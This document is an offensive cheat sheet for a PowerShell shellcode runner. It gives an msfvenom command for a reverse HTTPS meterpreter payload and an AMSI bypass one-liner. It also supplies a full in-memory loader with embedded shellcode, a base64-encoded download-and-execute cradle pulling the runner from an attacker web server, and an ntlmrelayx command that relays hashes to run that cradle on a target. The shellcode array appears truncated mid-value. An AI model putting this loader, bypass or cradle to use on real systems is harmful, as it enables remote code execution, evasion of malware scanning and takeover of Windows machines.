# PowerShell Shellcode Runner

1. Generate the Payload
```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -e x64/xor -f ps1
```

2. Write the PowerShell Shellcode Runner and place the generated payload into it.

```PowerShell
# Compact AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

# Shellcode loader >:]
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Copy shellcode to allocated memory
[Byte[]] $buf = 0x48,0x31,0xc9,0x48,0x81,0xe9,0xb5,0xff,0xff,0xff,0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0xc9,0xfa,0x48,0x75,0x8,0x4b,0xe6,0xe,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x35,0xb2,0xcb,0x91,0xf8,0xa3,0x2a,0xe,0xc9,0xfa,0x9,0x24,0x49,0x1b,0xb4,0x5f,0x81,0xcb,0x9a,0x23,0x6d,0x3,0x6d,0x5c,0xa9,0xb2,0xc3,0x27,0x10,0x3,0x6d,0x5c,0xe9,0xb2,0xc3,0x7,0x58,0x3,0xe9,0xb9,0x83,0xb0,0x5,0x44,0xc1,0x3,0xd7,0xce,0x65,0xc6,0x29,0x9,0xa,0x67,0xc6,0x4f,0x8,0x33,0x45,0x34,0x9,0x8a,0x4,0xe3,0x9b,0xbb,0x19,0x3d,0x83,0x19,0xc6,0x85,0x8b,0xc6,0x0,0x74,0xd8,0x2d,0x67,0x76,0xd1,0xf1,0x4a,0x7a,0x8d,0x39,0xe6,0xe,0xc9,0x71,0xc8,0xfd,0x8,0x4b,0xe6,0x46,0x4c,0x3a,0x3c,0x12,0x40,0x4a,0x36,0x85,0x81,0xe2,0xc,0xfe,0x48,0x6b,0xb6,0x47,0xc8,0x2a,0xab,0x23,0x40,0xb4,0x2f,0x4f,0x42,0xce,0xc0,0x3d,0x9,0x9d,0xab,0x3f,0x0,0xb2,0x79,0xb5,0x49,0x8a,0x2f,0x3,0x65,0xbb,0x49,0xb4,0x30,0xab,0x93,0xff,0x85,0xf9,0x4,0x51,0x0,0xe,0xdf,0xdf,0xbc,0x22,0x10,0x31,0x83,0xb,0xc2,0x47,0xc8,0x2a,0x2e,0x34,0x83,0x47,0xae,0x4a,0x42,0xba,0x54,0x3c,0x9,0x9b,0xa7,0x85,0xcd,0x72,0x0,0x74,0xd8,0xa,0xbe,0x4f,0x91,0xa4,0x11,0x2f,0x49,0x13,0xa7,0x57,0x88,0xa0,0x0,0xf6,0xe4,0x6b,0xa7,0x5c,0x36,0x1a,0x10,0x34,0x51,0x11,0xae,0x85,0xdb,0x13,0x3,0x8a,0xf7,0xb4,0xbb,0x46,0xf8,0x21,0x1b,0x3c,0xb6,0x3c,0x8f,0x60,0xa0,0x94,0x2d,0x1,0x8,0xa,0xb0,0x46,0x40,0x1b,0x1,0xb2,0xca,0x7,0x91,0x28,0xce,0x5,0x9d,0x26,0x5b,0x3,0x6f,0xef,0x9a,0xa0,0x5,0x44,0xc8,0x6,0xd7,0xc7,0x9a,0xa9,0x1,0xcf,0x32,0x1d,0x9f,0xa9,0xc9,0xfa,0x48,0x75,0xf7,0x9e,0xe,0x1,0xc9,0xfa,0x48,0x44,0x31,0x79,0xc8,0x3f,0xff,0xc2,0x66,0x41,0x31,0x65,0xd7,0x3f,0xfb,0xfa,0x12,0x3d,0x81,0x8a,0xaf,0xc9,0x9,0x41,0x49,0x75,0x8,0x6,0xd7,0xc7,0x9a,0xa9,0x22,0x76,0x5b,0x2,0x5c,0x59,0x40,0x65,0x8e,0x75,0x8,0x4b,0xe6,0xf1,0x1c,0x12,0x64,0x75,0x8,0x4b,0xc9,0x7d,0xaf,0x9d,0x7f,0xd,0x4f,0x3c,0xa5,0x6a,0x93,0xce,0x0,0x38,0x6f,0x12,0x91,0x54,0xfc,0xc8,0x2c,0x4d,0x49,0x7a,0xd5,0x5c,0xf0,0xbf,0x12,0x3f,0x3f,0x8,0xa4,0x77,0xa4,0x98,0x7f,0x14,0x6c,0x7b,0x89,0x46,0x98,0xfa,0x0,0xfc,0xc9,0x18,0xbc,0x4f,0x91,0xb7,0x79,0xbc,0x5b,0x3,0x5e,0xe,0xfb,0x52,0xcc,0x75,0x8,0x4b,0xe6,0x5e,0x9a,0xa9,0x1,0xb2,0xca,0xa0,0xb3,0x20,0xf2,0x5,0x9d,0x3d,0x81,0x8d,0x8c,0x4,0x96,0xb2,0xc1,0x84,0x62,0x54,0xbc,0x5c,0xa1,0x7a,0x7b,0x75,0x8,0x2,0x6f,0xee,0xa3,0xfe,0x9,0x2c,0x41,0xf1,0x93,0x48,0x57,0x7c,0x48,0x75,0x8,0x4b,0x19,0xdb,0x84,0xcb,0x88,0x26,0x52,0x3,0x6f,0xff,0x84,0xcb,0x81,0x38,0x39,0x82,0xb5,0x5d,0x80,0x3d,0x8a,0x58,0xe,0x53,0x9d,0xf1,0x1c,0x7f,0x88,0x0,0x17,0x3,0x21,0xcf,0x41,0xe9,0x48,0x75,0x41,0xf1,0xa2,0xfe,0xfc,0x1a,0x48,0x75,0x8,0x4b,0x19,0xdb,0x81,0x5,0x87,0x1,0xa,0xa0,0x4c,0xe6,0x9c,0xfa,0x48,0x75,0x5b,0x12,0x8c,0x4e,0x93,0xb3,0xc1,0xa4,0xc9,0xa9,0xf6,0x47,0xe,0x3a,0x48,0x65,0x8,0x4b,0xaf,0xb4,0x91,0x5e,0x1b,0x90,0x8,0x4b,0xe6,0xe,0x36,0x2f,0x0,0xe6,0x5b,0x18,0xae,0x87,0x2e,0xb2,0xc1,0x84,0x40,0xc2,0x3c,0x47,0xe,0x3a,0x48,0x55,0x8,0x4b,0xaf,0x87,0x30,0xb3,0xf2,0x67,0x9e,0xc2,0x4,0xe,0xc9,0xfa,0x48,0x8a,0xdd,0x3,0x65,0xca,0xe9,0x7f,0x88,0x1,0xba,0x2d,0x6d,0x9,0x81,0xfb,0x8b,0xf0,0xc8,0x3e,0x34,0x56,0xa,0xa2,0x22,0x75,0x51,0xf0,0x6,0x13,0xe3,0xf0,0x9,0xfc,0xd2,0xb4,0x33,0xe
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

3. Save the powershell code as "psrunner.txt" and host it in a web server.

4. Encode to base64 the step to run the Shellcode runner into memory.

```PowerShell
PS /home/v0lk3n> $text = "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/psrunner.txt')"
PS /home/v0lk3n> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)                                                                                 
PS /home/v0lk3n> $EncodedText = [Convert]::ToBase64String($bytes)                                                         
PS /home/v0lk3n> $EncodedText                                                                                             
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAxADIAOgA4ADAAOAAwAC8AcABzAHIAdQBuAG4AZQByAC4AdAB4AHQAJwApAA==

```

5. Serve it in the target machine

```PowerShell
powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAxADIAOgA4ADAAOAAwAC8AcABzAHIAdQBuAG4AZQByAC4AdAB4AHQAJwApAA=='
```

Example using Relay hash methode with impacket-ntlmrelayx hashes. (You should verify that ntlmrelayx intercept connection before it)

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.x.x -c 'powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAxADIAOgA4ADAAOAAwAC8AcABzAHIAdQBuAG4AZQByAC4AdAB4AHQAJwApAA=='
```